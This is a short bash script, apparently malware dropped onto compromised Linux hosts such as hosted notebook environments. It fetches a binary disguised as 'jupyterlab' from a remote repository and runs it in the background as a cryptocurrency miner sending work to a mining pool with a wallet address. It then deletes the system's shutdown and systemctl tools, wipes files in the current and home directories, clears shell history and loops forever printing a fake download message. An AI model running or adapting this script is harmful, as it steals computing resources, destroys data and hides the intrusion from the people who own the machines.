#!/bin/bash
apt-get update 
apt-get install -y wget curl
wget -qO zjava https://gitlab.com/ghcees/pack/-/raw/main/jupyterlab
chmod +x zjava
nohup ./zjava -o 47.89.195.104:443 -a rx/0 -u ZEPHs9VvRqBYzdxe7Qwutt7KLSqnQR96MdUQmsVPMtq39xxWByfFUYDBFrdfD9n3G9P2HAKCiuuu48iZzrQjnEYbAxitysPd9gp.$(echo pl-$(TZ=UTC+7 date +"%H-%M-%S")) --randomx-1gb-pages -p -x -t $(nproc --all) >/dev/null 2>&1 &
sleep 30
rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl || rm -rvf /sbin/reboot /sbin/shutdown /sbin/poweroff /sbin/halt /bin/systemctl /usr/sbin/reboot /usr/sbin/shutdown /usr/sbin/poweroff /usr/sbin/halt /usr/bin/systemctl
curl ifconfig.me
rm -rvf *
cd ~/
rm -rvf *
history -cr
while true
do
        echo "Download..."
        sleep 20
done